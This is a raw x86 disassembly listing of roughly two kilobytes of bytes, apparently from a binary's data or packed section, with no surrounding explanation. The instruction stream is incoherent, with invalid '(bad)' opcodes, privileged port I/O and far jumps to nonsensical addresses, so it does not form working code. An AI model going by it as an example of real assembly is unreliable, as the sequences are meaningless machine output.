  4032f3:	gs push esp
  4032f5:	sbb    BYTE PTR [ebp+0x1b],dl
  4032f8:	cmp    dh,dl
  4032fa:	push   edi
  4032fb:	mov    edx,0x2feed6bf
  403300:	cwde   
  403301:	out    0xeb,al
  403303:	cwde   
  403304:	mov    ebp,0x8e2c28fe
  403309:	jmp    0x40337b
  40330b:	mov    edx,0x97b54186
  403310:	in     al,dx
  403311:	inc    edi
  403312:	push   0xffffffe1
  403314:	cmp    BYTE PTR [ecx+0x4ab1bf68],0x95
  40331b:	in     eax,0x7
  40331d:	jmp    0x40335b
  40331f:	and    DWORD PTR [ebp-0x606e3654],ebp
  403325:	cld    
  403326:	sbb    dh,cl
  403328:	xchg   ecx,eax
  403329:	cli    
  40332a:	fild   WORD PTR [ecx-0x4]
  40332d:	jmp    0xee28d0db
  403332:	fld    QWORD PTR [edx+0x66a76f25]
  403338:	es popa 
  40333a:	out    0xeb,al
  40333c:	cmp    DWORD PTR [ebx-0x5938aea3],edi
  403342:	int3   
  403343:	sbb    eax,0xaa1d1685
  403348:	(bad)  
  403349:	int3   
  40334a:	pop    ss
  40334b:	inc    ebx
  40334c:	push   ebx
  40334d:	and    al,0xa8
  40334f:	js     0x40332a
  403351:	cmc    
  403352:	loopne 0x403334
  403354:	cld    
  403355:	mov    edi,0xb816e55b
  40335a:	push   ebx
  40335b:	mov    eax,ebp
  40335d:	jle    0x40336e
  40335f:	leave  
  403360:	jnp    0x403393
  403362:	jecxz  0x40335c
  403364:	outs   dx,DWORD PTR ds:[esi]
  403365:	sub    al,0x9a
  403367:	rol    DWORD PTR [esi+0x3d],0x82
  40336b:	inc    ebp
  40336c:	ss fcom QWORD PTR cs:[ecx]
  403370:	xchg   ecx,eax
  403371:	cs sub eax,eax
  403374:	jg     0x403378
  403376:	jecxz  0x4033df
  403378:	pop    esi
  403379:	mov    WORD PTR [ecx-0x3a87dee6],gs
  40337f:	fsubr  DWORD PTR [eax+0xb]
  403382:	jmp    0x4033a6
  403384:	sbb    ah,al
  403386:	pop    es
  403387:	mov    esp,0xd5c582e8
  40338c:	push   esi
  40338d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40338e:	push   cs
  40338f:	sub    eax,0xf9088333
  403394:	(bad)  
  403396:	adc    BYTE PTR [ebx-0x1cb37e1a],ah
  40339c:	ja     0x403330
  40339e:	mov    edx,0x8ece8786
  4033a3:	xchg   esi,eax
  4033a4:	mov    edi,DWORD PTR ds:0xa6df851a
  4033aa:	out    dx,al
  4033ab:	out    dx,al
  4033ac:	je     0x403349
  4033ae:	(bad)
  4033b1:	shr    BYTE PTR [eax+0x1d1c2156],1
  4033b7:	ins    DWORD PTR es:[edi],dx
  4033b8:	push   ebp
  4033b9:	cld    
  4033ba:	and    DWORD PTR [esi+0x6a267f35],ecx
  4033c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033c1:	leave  
  4033c2:	fsub   QWORD PTR [edi+eiz*1-0x13]
  4033c6:	stos   BYTE PTR es:[edi],al
  4033c7:	mov    ebx,0x516e496d
  4033cc:	lods   al,BYTE PTR ds:[esi]
  4033cd:	xor    eax,0x76b2eda1
  4033d2:	pushf  
  4033d3:	jns    0x4033c9
  4033d5:	sahf   
  4033d6:	xchg   ebp,eax
  4033d7:	add    ecx,DWORD PTR [esi+0x53c74bcf]
  4033dd:	mov    DWORD PTR [esp+ebp*1+0x33],eax
  4033e1:	call   0xe31f1f56
  4033e6:	pop    es
  4033e7:	call   0xf8090dfe
  4033ec:	mov    esp,0xce07868c
  4033f1:	adc    cl,BYTE PTR [ebx+0x65]
  4033f4:	loop   0x40342a
  4033f6:	loop   0x403439
  4033f8:	imul   esi,DWORD PTR [esi+0x45776028],0xa9ebaf1d
  403402:	ret    0x9f04
  403405:	ins    BYTE PTR es:[edi],dx
  403406:	popa   
  403407:	pop    ds
  403408:	fs mov ecx,0xfcc61448
  40340e:	pop    eax
  40340f:	int3   
  403410:	jmp    0x403464
  403412:	jmp    0x40340e
  403414:	not    DWORD PTR [eax+eax*1]
  403417:	stos   BYTE PTR es:[edi],al
  403418:	icebp  
  403419:	stc    
  40341a:	jae    0x4033f8
  40341c:	imul   esi,DWORD PTR [esi],0x6d61ac88
  403422:	outs   dx,BYTE PTR ds:[esi]
  403423:	sti    
  403424:	jne    0x403467
  403426:	icebp  
  403427:	cmp    DWORD PTR [ebx-0x47],edi
  40342a:	dec    edx
  40342b:	jl     0x403438
  40342d:	jmp    DWORD PTR [ebx]
  40342f:	lea    dx,[ecx-0x2286f8e4]
  403436:	arpl   WORD PTR ds:0x2d73590d,sp
  40343c:	inc    edi
  40343d:	xor    BYTE PTR [ebx*1-0x4297e31b],dh
  403444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403445:	test   eax,0x98393d8c
  40344a:	and    BYTE PTR [ecx+esi*8],0x61
  40344e:	fucomp st(3)
  403450:	imul   esp,DWORD PTR [ebx],0xffffffb0
  403453:	and    eax,0x9769a944
  403458:	or     ch,cl
  40345a:	mov    BYTE PTR [ebx-0x61f0bec],al
  403460:	xor    DWORD PTR [edi+0x34],ecx
  403463:	and    ebp,edx
  403465:	mov    ecx,0x2be70537
  40346a:	js     0x40346e
  40346c:	pushf  
  40346d:	jg     0x4034a6
  40346f:	adc    DWORD PTR [esi-0x260c6ddc],0x1ca5cf87
  403479:	lahf   
  40347a:	and    al,0x2c
  40347c:	fst    DWORD PTR [esi]
  40347e:	push   0x30f32f40
  403483:	and    dl,BYTE PTR [eax+0x1fa670ea]
  403489:	and    al,0x51
  40348b:	bound  esi,QWORD PTR [ecx-0x4b]
  40348e:	daa    
  40348f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403490:	dec    ecx
  403491:	mov    ds:0xff8d5f2f,eax
  403496:	dec    eax
  403497:	jmp    0x884f:0x2bb2f5c
  40349e:	ror    DWORD PTR [edx],cl
  4034a0:	sub    cl,cl
  4034a2:	jnp    0x403517
  4034a4:	pop    ebx
  4034a5:	cmp    eax,0x3b70da84
  4034aa:	test   al,0xe2
  4034ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ad:	cmc    
  4034ae:	clc    
  4034af:	pop    esp
  4034b0:	jp     0x40348b
  4034b2:	es ret 0xda18
  4034b6:	fidivr DWORD PTR [edi+0x7c]
  4034b9:	dec    ecx
  4034ba:	jge    0x403515
  4034bc:	mov    edi,ecx
  4034be:	fiadd  WORD PTR [edx+0x35]
  4034c1:	std    
  4034c2:	lds    edi,FWORD PTR [ebx]
  4034c4:	and    DWORD PTR [ebx-0x25d85006],eax
  4034ca:	push   esi
  4034cb:	bound  esi,QWORD PTR [edx]
  4034cd:	push   ss
  4034ce:	retf   0x2622
  4034d1:	sub    ch,BYTE PTR [esi]
  4034d3:	pop    edx
  4034d4:	xchg   DWORD PTR [ecx+eiz*2-0x47],ecx
  4034d8:	adc    eax,0xd204622d
  4034dd:	clc    
  4034de:	xchg   BYTE PTR [edx],ah
  4034e0:	sahf   
  4034e1:	je     0x4034e0
  4034e3:	pop    ss
  4034e4:	mov    al,0xac
  4034e6:	fs dec eax
  4034e8:	ss mov dh,0xa9
  4034eb:	out    0x9,al
  4034ed:	sbb    eax,DWORD PTR [eax-0x40278fb4]
  4034f3:	fs das 
  4034f5:	ret    
  4034f6:	fiadd  WORD PTR [edi]
  4034f8:	repnz dec dh
  4034fb:	fs push es
  4034fd:	sti    
  4034fe:	mov    edx,DWORD PTR [ecx+ebx*1-0xb]
  403502:	mov    ah,0xb4
  403504:	xchg   ecx,eax
  403505:	rcr    dh,1
  403507:	stc    
  403508:	jns    0x403567
  40350a:	and    al,BYTE PTR [ecx-0x1a92197f]
  403510:	(bad)  
  403511:	icebp  
  403512:	cmp    BYTE PTR [eax+0x7d704722],dl
  403518:	mov    WORD PTR [ebx+0x5c],cs
  40351b:	fisub  WORD PTR es:[esi+0x4a]
  40351f:	push   ebx
  403520:	ins    BYTE PTR es:[edi],dx
  403521:	popa   
  403522:	cli    
  403523:	ins    DWORD PTR es:[edi],dx
  403524:	mul    DWORD PTR [esi+eiz*8]
  403527:	inc    ebp
  403528:	add    DWORD PTR ds:0xfd537104,ecx
  40352e:	xor    eax,0x33660b19
  403533:	add    dh,dl
  403535:	leave  
  403536:	sub    eax,0x8736661c
  40353b:	bound  eax,QWORD PTR [ecx+0xa9fc532]
  403541:	daa    
  403542:	jg     0x403538
  403544:	adc    BYTE PTR [ecx],0x28
  403547:	mov    al,0x67
  403549:	push   0x53963f72
  40354e:	(bad)  
  40354f:	and    al,al
  403551:	je     0x403591
  403553:	pushf  
  403554:	(bad)  
  403555:	xchg   esp,eax
  403556:	pusha  
  403557:	lds    edx,FWORD PTR [edi+0x152f7e70]
  40355d:	cmp    ebp,edi
  40355f:	fisub  WORD PTR ds:0x58a1e1eb
  403565:	xor    DWORD PTR [ebx],eax
  403567:	add    ah,BYTE PTR [ecx+0x70522af2]
  40356d:	sar    BYTE PTR [eax+0x23],cl
  403570:	push   ecx
  403571:	jge    0x403537
  403573:	enter  0xd7,0xbd
  403577:	pop    edi
  403578:	sbb    esp,eax
  40357a:	sub    eax,0x62c145ce
  40357f:	mov    dl,0xc7
  403581:	fbld   TBYTE PTR [ecx-0xe869871]
  403587:	aam    0x71
  403589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40358a:	pop    ebx
  40358b:	mov    ecx,0x38d7f851
  403590:	and    ebp,edi
  403592:	scas   eax,DWORD PTR es:[edi]
  403593:	fistp  DWORD PTR [esi+0x771f4f96]
  403599:	(bad)  
  40359a:	icebp  
  40359b:	in     eax,dx
  40359c:	jmp    FWORD PTR [ebp+ebx*2-0x6c]
  4035a0:	jmp    0x2d545675
  4035a5:	retf   0xde4d
  4035a8:	pop    esi
  4035a9:	call   0x624b:0x6657f98e
  4035b0:	xor    ecx,esi
  4035b2:	out    0x4c,al
  4035b4:	cld    
  4035b5:	cs xchg esp,eax
  4035b7:	fistp  DWORD PTR [ebx+0x182d4b1f]
  4035bd:	fwait
  4035be:	or     BYTE PTR [ebp+0x2c],cl
  4035c1:	push   cs
  4035c2:	mov    ecx,0xee162ba
  4035c7:	inc    ebx
  4035c8:	or     al,BYTE PTR [edx+0x7fb343a7]
  4035ce:	fwait
  4035cf:	repz pop ds
  4035d1:	sbb    eax,0xf5ef3384
  4035d6:	pop    eax
  4035d7:	pop    ss
  4035d8:	clc    
  4035d9:	push   eax
  4035da:	int3   
  4035db:	mov    ebp,0x62cb2c95
  4035e0:	pushf  
  4035e1:	test   BYTE PTR [edx+edx*8],bl
  4035e4:	repnz xchg ecx,eax
  4035e6:	mov    al,ds:0x3ea88337
  4035eb:	nop
  4035ec:	shl    BYTE PTR [ebx+0x55eb96ab],1
  4035f2:	and    DWORD PTR ds:0x37b14b1e,ebp
  4035f8:	std    
  4035f9:	outs   dx,BYTE PTR ds:[esi]
  4035fa:	iret   
  4035fb:	stos   BYTE PTR es:[edi],al
  4035fc:	xor    bl,bl
  4035fe:	repnz int 0x94
  403601:	xlat   BYTE PTR ds:[ebx]
  403602:	mov    ch,BYTE PTR [eax]
  403604:	lods   al,BYTE PTR ds:[esi]
  403605:	in     al,dx
  403606:	mov    ds:0xd725f8a,al
  40360b:	sbb    al,0xba
  40360d:	inc    esi
  40360e:	jmp    FWORD PTR [esi]
  403610:	in     eax,0x60
  403612:	loop   0x403619
  403614:	sbb    DWORD PTR [edi],edi
  403616:	shl    DWORD PTR [edx*8+0x6e8b3201],0x76
  40361e:	add    eax,0xb939fcbb
  403623:	jno    0x4036a1
  403625:	(bad)  
  403626:	bound  ebx,QWORD PTR [esi+0x3673f1d3]
  40362c:	outs   dx,BYTE PTR ds:[esi]
  40362d:	push   0xc54054fe
  403632:	jl     0x40365b
  403634:	mov    BYTE PTR [ecx],0xb2
  403637:	sti    
  403638:	pop    DWORD PTR [edi+0x748728d5]
  40363e:	cli    
  40363f:	aad    0xdb
  403641:	or     al,0x2e
  403643:	in     al,dx
  403644:	mov    eax,0x817f5ff0
  403649:	or     al,0x64
  40364b:	push   eax
  40364c:	loop   0x4035e8
  40364e:	sbb    DWORD PTR ds:0x836ff280,0xffffffae
  403655:	mov    db0,esp
  403658:	daa    
  403659:	mov    gs,WORD PTR [ecx-0x67]
  40365c:	jbe    0x4036b7
  40365e:	stos   DWORD PTR es:[edi],eax
  40365f:	ss pop ss
  403661:	jle    0x403673
  403663:	dec    ecx
  403664:	das    
  403665:	xchg   BYTE PTR ds:0x29fd4399,dl
  40366b:	dec    ecx
  40366c:	stos   DWORD PTR es:[edi],eax
  40366d:	xlat   BYTE PTR ds:[ebx]
  40366e:	out    0x2,al
  403670:	xor    al,0x57
  403672:	fadd   QWORD PTR [edx+0x5c]
  403675:	das    
  403676:	and    al,0x2
  403678:	rcr    DWORD PTR ds:0x2a18fee,0xa4
  40367f:	xor    ah,dh
  403681:	mov    ah,0xfa
  403683:	arpl   WORD PTR [ecx],di
  403685:	not    edi
  403687:	out    0x1e,al
  403689:	jo     0x4036b0
  40368b:	pop    ecx
  40368c:	push   edx
  40368d:	dec    edi
  40368e:	hlt    
  40368f:	mov    eax,0x3904363d
  403694:	and    ah,bh
  403696:	test   DWORD PTR [esi+0x25],ebp
  403699:	inc    edi
  40369a:	mov    ds:0x2601e058,eax
  40369f:	sar    DWORD PTR [ecx+0xd],cl
  4036a2:	mov    edi,0x6e811f8
  4036a7:	fcmovu st,st(0)
  4036a9:	hlt    
  4036aa:	pop    ebp
  4036ab:	push   ebp
  4036ac:	into   
  4036ad:	push   esi
  4036ae:	out    0xb5,al
  4036b0:	js     0x403651
  4036b2:	and    BYTE PTR [eax+0x26b6e8e6],dl
  4036b8:	ins    BYTE PTR es:[edi],dx
  4036b9:	sti    
  4036ba:	cmp    eax,0x3401904c
  4036bf:	or     ch,BYTE PTR [esi]
  4036c1:	jne    0x4036e9
  4036c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036c4:	je     0x4036c0
  4036c6:	mov    al,ds:0xd067c706
  4036cb:	mov    dl,0x9b
  4036cd:	shl    BYTE PTR [esi+0x7ca18a16],1
  4036d3:	out    0x39,al
  4036d5:	xchg   esi,eax
  4036d6:	stc    
  4036d7:	imul   edx,DWORD PTR [edx+ebx*4+0x7e],0x19
  4036dc:	ins    BYTE PTR es:[edi],dx
  4036dd:	cmc    
  4036de:	adc    esi,ebx
  4036e0:	add    bl,BYTE PTR ss:[edx+ebx*1-0x1c]
  4036e5:	xchg   ecx,eax
  4036e6:	retf   
  4036e7:	dec    esp
  4036e8:	fild   QWORD PTR [edi+eiz*8+0x1017c98d]
  4036ef:	mov    dh,0x71
  4036f1:	cs adc eax,0x9bb2242
  4036f7:	cs mov bh,0x32
  4036fa:	data16 add BYTE PTR [ebx-0x46],dh
  4036fe:	or     ah,BYTE PTR [eax]
  403700:	outs   dx,DWORD PTR ds:[esi]
  403701:	pop    esi
  403702:	mov    ah,0x26
  403704:	cld    
  403705:	dec    edi
  403706:	frstor [esi-0x59]
  403709:	les    ebp,FWORD PTR cs:[ebx+esi*1+0x4c917fd0]
  403711:	mov    edx,0xcd6264fc
  403716:	dec    ebp
  403717:	aaa    
  403718:	data16 js 0x4036fc
  40371b:	(bad)  
  40371c:	mov    bh,0x7e
  40371e:	jle    0x4036ea
  403720:	stos   BYTE PTR es:[edi],al
  403721:	push   ss
  403722:	fdivrp st(7),st
  403724:	pushf  
  403725:	or     eax,0x8e3416a2
  40372a:	aad    0x74
  40372c:	mov    cl,0x82
  40372e:	nop
  40372f:	adc    esp,DWORD PTR [ecx]
  403731:	cld    
  403732:	cmp    eax,0x5a50367a
  403737:	mov    dl,0x24
  403739:	adc    ch,dl
  40373b:	fdiv   QWORD PTR [ecx-0x3a]
  40373e:	xor    esi,edx
  403740:	pushf  
  403741:	xchg   esi,eax
  403742:	lea    esi,[edi]
  403744:	outs   dx,DWORD PTR ds:[esi]
  403745:	mov    al,0x64
  403747:	loopne 0x4036ff
  403749:	data16 das 
  40374b:	jmp    0x6b971ee1
  403750:	sub    BYTE PTR [ebx+0x44b8fb9a],ah
  403756:	dec    esi
  403757:	xor    BYTE PTR [ebp-0x5f6a8998],0x33
  40375e:	repnz fidivr WORD PTR [ebx+0x64d44fea]
  403765:	jg     0x4036ed
  403767:	push   0xffffffb9
  403769:	arpl   WORD PTR [ecx+0x17],dx
  40376c:	sbb    al,0x73
  40376e:	sub    BYTE PTR [edx+0x47],al
  403771:	gs and eax,0x9d9c9c3d
  403777:	ja     0x4037b8
  403779:	jg     0x4037d6
  40377b:	ins    BYTE PTR es:[edi],dx
  40377c:	repnz es mov ah,0x70
  403780:	xor    eax,0x342f8670
  403785:	ret    
  403786:	mov    ebp,0x2dcfc01b
  40378b:	nop
  40378c:	lds    esi,FWORD PTR [ebx]
  40378e:	nop
  40378f:	mov    al,ds:0xe0fc74bc
  403794:	cwde   
  403795:	mov    eax,0x39fcb425
  40379a:	add    bl,BYTE PTR [ebx-0x66]
  40379d:	(bad)  
  40379f:	or     BYTE PTR [ebp+0x1b],bl
  4037a2:	dec    esp
  4037a3:	enter  0x632a,0x9e
  4037a7:	and    BYTE PTR [edx+0x30],0x2c
  4037ab:	adc    al,0xa5
  4037ad:	jmp    0x40381c
  4037af:	sbb    BYTE PTR [eax+0x1f],dh
  4037b2:	pop    es
  4037b3:	sub    DWORD PTR [edi+0x39],ebp
  4037b6:	scas   al,BYTE PTR es:[edi]
  4037b7:	lea    edx,[edx-0x33]
  4037ba:	je     0x403838
  4037bc:	jae    0x40381e
  4037be:	push   esi
  4037bf:	push   cs
  4037c0:	xor    eax,0xb19d655c
  4037c5:	pop    es
  4037c6:	aaa    
  4037c7:	adc    DWORD PTR [esp+ebp*4-0x76],0x9
  4037cc:	shl    dh,cl
  4037ce:	jns    0x4037a9
  4037d0:	mov    edi,0xa100628f
  4037d5:	mov    esp,0x50f2c227
  4037da:	xor    ebp,DWORD PTR [ebp-0x64]
  4037dd:	inc    eax
  4037de:	sub    al,0x3a
  4037e0:	or     eax,DWORD PTR [edx-0x3a]
  4037e3:	scas   eax,DWORD PTR es:[edi]
  4037e4:	mov    BYTE PTR [edx],dl
  4037e6:	imul   DWORD PTR [esi+0x3b90ea31]
  4037ec:	scas   eax,DWORD PTR es:[edi]
  4037ed:	sub    BYTE PTR [edx+0x7bbdd7c4],cl
  4037f3:	xor    BYTE PTR [ebx],dh
  4037f5:	jge    0x403839
  4037f7:	dec    DWORD PTR [edx+eiz*2]
  4037fa:	out    0xd,al
  4037fc:	adc    eax,0x859e2175
  403801:	(bad)  
  403802:	clc    
  403803:	push   esi
  403804:	pop    ds
  403805:	or     BYTE PTR [edx-0xd1c9eb6],ch
  40380b:	jo     0x4037f0
  40380d:	cmp    eax,DWORD PTR [esi]
  40380f:	lods   eax,DWORD PTR ds:[esi]
  403810:	sub    eax,0x7291e29f
  403815:	addr16 in eax,dx
  403817:	xchg   ebx,eax
  403818:	movd   mm2,DWORD PTR [ecx]
  40381b:	nop
  40381c:	lods   al,BYTE PTR ds:[esi]
  40381d:	fist   WORD PTR [ecx+0x57]
  403820:	mov    ds:0xc8a22c5a,al
  403825:	add    ebx,ebx
  403827:	sti    
  403828:	hlt    
  403829:	mov    esi,0xc4ac7d30
  40382e:	mov    ds:0x5e047b38,eax
  403833:	cwde   
  403834:	add    cl,BYTE PTR [ebx-0x79dc63f4]
  40383a:	sar    DWORD PTR [eax],0x5
  40383d:	cld    
  40383e:	pop    eax
  40383f:	inc    edx
  403840:	and    ah,ah
  403842:	mov    WORD PTR [eax-0x62],cs
  403845:	jecxz  0x403855
  403847:	push   ebx
  403848:	out    dx,al
  403849:	mov    gs,WORD PTR [ebx+0x73]
  40384c:	push   eax
  40384d:	test   al,0x37
  40384f:	sti    
  403850:	inc    ecx
  403851:	addr16 mov eax,0x639058ff
  403857:	push   ss
  403858:	xchg   WORD PTR gs:[edx-0x437fd782],di
  403860:	fdivp  st(7),st
  403862:	jge    0x4037fd
  403864:	dec    eax
  403865:	xor    al,BYTE PTR [eax+0x79]
  403868:	mov    ebx,0x1fa2e46b
  40386d:	retf   0x261b
  403870:	xchg   ebp,eax
  403871:	sub    eax,0x57e3a7b0
  403876:	and    eax,0x3f0f6f7c
  40387b:	xchg   ecx,eax
  40387c:	adc    eax,0x92c13fbe
  403881:	rol    DWORD PTR [ebx+0x11],cl
  403884:	mov    es:0xefc3963c,eax
  40388a:	add    eax,0x9237f5ff
  40388f:	mov    DWORD PTR [eax+ebx*4-0x14f032cb],ecx
  403896:	cmc    
  403897:	cld    
  403898:	test   eax,0xd72a85ff
  40389d:	mov    esi,ds
  40389f:	lahf   
  4038a0:	stos   BYTE PTR es:[edi],al
  4038a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038a2:	rcr    BYTE PTR [ebx],0xd0
  4038a5:	add    edi,DWORD PTR [edx-0x7b30b84e]
  4038ab:	(bad)  
  4038ac:	jmp    0x4709:0x29fefebe
  4038b3:	fcmovu st,st(2)
  4038b5:	int3   
  4038b6:	stos   BYTE PTR es:[edi],al
  4038b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038b8:	and    al,0x83
  4038ba:	cwde   
  4038bb:	es loopne 0x4038c0
  4038be:	cmp    eax,0x84cf521d
  4038c3:	inc    esi
  4038c4:	jecxz  0x4038fe
  4038c6:	out    0x72,al
  4038c8:	jno    0x4038da
  4038ca:	mov    bl,0xa9
  4038cc:	js     0x4038fe
  4038ce:	adc    BYTE PTR [ebx],bl
  4038d0:	sub    dl,al
  4038d2:	mov    dl,0xa1
  4038d4:	and    BYTE PTR ss:[ecx-0x66],ah
  4038d8:	frstor [edi+0x1b117bec]
  4038de:	sub    BYTE PTR [edi+0x50],ah
  4038e1:	div    bh
  4038e3:	inc    edx
  4038e4:	out    0x9b,eax
  4038e6:	and    dh,0xf3
  4038e9:	xor    ch,0xba
  4038ec:	dec    esi
  4038ed:	outs   dx,BYTE PTR ds:[esi]
  4038ee:	lahf   
  4038ef:	int3   
  4038f0:	popf   
  4038f1:	xchg   edx,eax
  4038f2:	test   eax,0x495207c8
  4038f7:	pop    ebx
  4038f8:	pop    es
  4038f9:	adc    BYTE PTR [edi-0x692ac447],ch
  4038ff:	mov    ecx,0xa73d72e
  403904:	shl    BYTE PTR [esi-0x6b82870f],1
  40390a:	inc    ebx
  40390b:	aam    0x1d
  40390d:	and    DWORD PTR ds:0x63ba36a8,0x6af7ab4e
  403917:	xor    eax,0xd7af0b91
  40391c:	retf   0xd9aa
  40391f:	pop    ebx
  403920:	pop    ecx
  403921:	xor    al,0x45
  403923:	jae    0x403946
  403925:	adc    DWORD PTR [edx+0xc265805],ebx
  40392b:	mov    BYTE PTR [ebp+0x198fc842],0x87
  403932:	scas   al,BYTE PTR es:[edi]
  403933:	out    0x30,eax
  403935:	aad    0xc1
  403937:	sar    BYTE PTR [ebx-0x53dec436],cl
  40393d:	push   cs
  40393e:	inc    edi
  40393f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403940:	mov    dl,0x87
  403942:	push   ss
  403943:	dec    edi
  403944:	cmp    ch,BYTE PTR [ecx-0x16a046be]
  40394a:	(bad)  
  40394b:	mov    ebp,0x13470fb3
  403950:	pop    es
  403951:	mov    edx,0xc9fd7e24
  403956:	out    dx,eax
  403957:	pop    ebp
  403959:	dec    ecx
  40395a:	dec    eax
  40395b:	leave  
  40395c:	pop    ecx
  40395d:	push   ebp
  40395e:	std    
  40395f:	mov    esp,0x953dcdcd
  403964:	xchg   ebx,eax
  403965:	or     ebp,ebp
  403967:	mov    ?,WORD PTR [edi+0x55884c3]
  40396d:	mov    dl,0x45
  40396f:	rol    DWORD PTR [edx],0xfd
  403972:	sbb    BYTE PTR [eax-0x6a38b2e9],bh
  403978:	test   eax,0xf661b420
  40397d:	add    al,0x8d
  40397f:	stc    
  403980:	mov    esp,0x58c1df79
  403985:	(bad)  
  403986:	cwde   
  403987:	and    ecx,DWORD PTR [ecx+esi*2+0x1f58df35]
  40398e:	mov    ecx,0xfee4bf31
  403993:	inc    eax
  403994:	and    bl,BYTE PTR [edi-0x44]
  403997:	and    al,0x9a
  403999:	pop    edi
  40399a:	push   edx
  40399b:	push   ecx
  40399c:	pushf  
  40399d:	aam    0xec
  40399f:	xchg   ebp,eax
  4039a0:	cmp    DWORD PTR [ebp+0x6752be6],edi
  4039a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039a7:	and    ah,al
  4039a9:	out    0xf0,eax
  4039ab:	jge    0x4039b9
  4039ad:	inc    edi
  4039ae:	or     BYTE PTR [ebp+ebp*4-0x49],0x17
  4039b3:	mov    dl,0xb7
  4039b5:	xchg   esi,eax
  4039b6:	jge    0x4039c1
  4039b8:	xor    bl,dh
  4039ba:	cmp    ebx,DWORD PTR [ebp+0x2d]
  4039bd:	xor    eax,0xc72a50ef
  4039c2:	rcr    BYTE PTR [eax],0x25
  4039c5:	adc    BYTE PTR [eax+esi*8-0x605e7981],cl
  4039cc:	int3   
  4039cd:	add    ch,dh
  4039cf:	hlt    
  4039d0:	cmp    DWORD PTR [edi],eax
  4039d2:	shr    dh,1
  4039d4:	stos   DWORD PTR es:[edi],eax
  4039d5:	shl    DWORD PTR [ebx+0x27c8ac80],0xdd
  4039dc:	adc    al,0x1a
  4039de:	clc    
  4039df:	sbb    DWORD PTR fs:[ebx+0x68],0x14
  4039e4:	outs   dx,BYTE PTR ds:[esi]
  4039e5:	fs stos DWORD PTR es:[edi],eax
  4039e7:	xchg   edx,eax
  4039e8:	add    DWORD PTR [esi],edi
  4039ea:	pop    ebx
  4039eb:	outs   dx,BYTE PTR ds:[esi]
  4039ec:	jmp    0xdefa3661
  4039f1:	mov    al,ds:0xb2ad2700
  4039f6:	(bad)  
  4039f7:	in     al,dx
  4039f8:	outs   dx,DWORD PTR ds:[esi]
  4039f9:	lahf   
  4039fa:	mov    ecx,0xa005a9f8
  4039ff:	mov    DWORD PTR [edi-0x4aac751a],esp
  403a05:	icebp  
  403a06:	fsub   st,st(2)
  403a08:	mov    ah,BYTE PTR [eax-0x190ec3bd]
  403a0e:	in     eax,0xac
  403a10:	les    ebp,FWORD PTR [ebx-0x4cad89c4]
  403a16:	jnp    0x403a5e
  403a18:	xchg   ebx,eax
  403a19:	push   es
  403a1a:	test   DWORD PTR [ebx-0x21f8e327],ebp
  403a20:	mov    bh,0xd7
  403a22:	into   
  403a23:	inc    esi
  403a24:	and    eax,0xf20be1cb
  403a29:	jge    0x403aa4
  403a2b:	adc    DWORD PTR [edx+0x69ff7fc1],0xa7bac48b
  403a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a36:	in     eax,dx
  403a37:	mov    ss,eax
  403a39:	push   esp
  403a3a:	pop    DWORD PTR [esi+0x757121ed]
  403a40:	mov    eax,ds:0x9ac6327f
  403a45:	mov    bh,0xa9
  403a47:	pushf  
  403a48:	lock arpl WORD PTR [eax-0x1c],cx
  403a4c:	pop    edi
  403a4d:	mov    ebp,0xd33c7b16
  403a52:	xchg   ecx,eax
  403a53:	data16 xor ch,ch
  403a56:	jno    0x403a75
  403a58:	xchg   esp,eax
  403a59:	push   ds
  403a5a:	es jle 0x403a6f
  403a5d:	mov    ds:0x470851d9,eax
  403a62:	jae    0x4039ee
  403a64:	adc    al,0x3
  403a66:	test   eax,0xec34d62
  403a6b:	sbb    al,0xfb
  403a6d:	mov    ch,0x8b
  403a6f:	cmp    al,0x37
  403a71:	clc    
  403a72:	nop
  403a73:	lock pop ebx
  403a75:	ins    BYTE PTR es:[edi],dx
  403a76:	test   al,0xdd
  403a78:	lods   al,BYTE PTR ds:[esi]
  403a79:	cmp    DWORD PTR [edi-0x7a696b48],0x36b51b22
  403a83:	mov    edx,0x75ecc2ab
  403a88:	test   BYTE PTR [edx-0x13c4c206],al
  403a8e:	fistp  DWORD PTR [edi-0x78960c20]
  403a94:	test   esi,0x5576145f
  403a9a:	pop    edx
  403a9b:	jae    0x403a99
  403a9d:	inc    edx
  403a9e:	rcl    DWORD PTR [eax+0x3ef90bbf],1
  403aa4:	lods   al,BYTE PTR ds:[esi]
  403aa5:	sub    BYTE PTR ds:0x5a34ff52,0x96
  403aac:	and    ebx,ebx
  403aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aaf:	xor    al,0xda
  403ab1:	mov    esi,edi
  403ab3:	into   
  403ab4:	loop   0x403a9a
  403ab6:	fld    DWORD PTR [ecx]
  403ab8:	xchg   edi,eax
  403ab9:	retf   
  403aba:	int    0x79
  403abc:	into   
  403abd:	into   
  403abe:	adc    eax,0x4cac14ed
  403ac3:	pop    ss
  403ac4:	cmp    edx,0xffffff88
  403ac7:	aad    0xe
  403ac9:	outs   dx,DWORD PTR ds:[esi]
  403aca:	and    BYTE PTR [ebx*8+0x761d664c],bl
  403ad1:	outs   dx,DWORD PTR ds:[esi]
  403ad2:	push   eax
  403ad3:	dec    edi
  403ad4:	push   edi
  403ad5:	mov    eax,0xdb867b37
  403ada:	test   al,0xa1
  403adc:	mov    ecx,0xf3898fb
  403ae1:	stos   DWORD PTR es:[edi],eax
  403ae2:	inc    ebp
  403ae3:	cmp    DWORD PTR [edi],edi
  403ae5:	in     eax,dx
  403ae6:	cmp    al,0xe1
  403ae8:	jmp    0x403ab3
  403aea:	adc    eax,0x8e83c4e1
  403aef:	mov    eax,0xf6e82c20
  403af4:	pop    ebp
  403af5:	mov    al,ds:0xb962359c
  403afa:	das    
  403afb:	scas   eax,DWORD PTR es:[edi]
  403afc:	xchg   ebx,eax
  403afd:	add    DWORD PTR [edx+0x7e],ecx
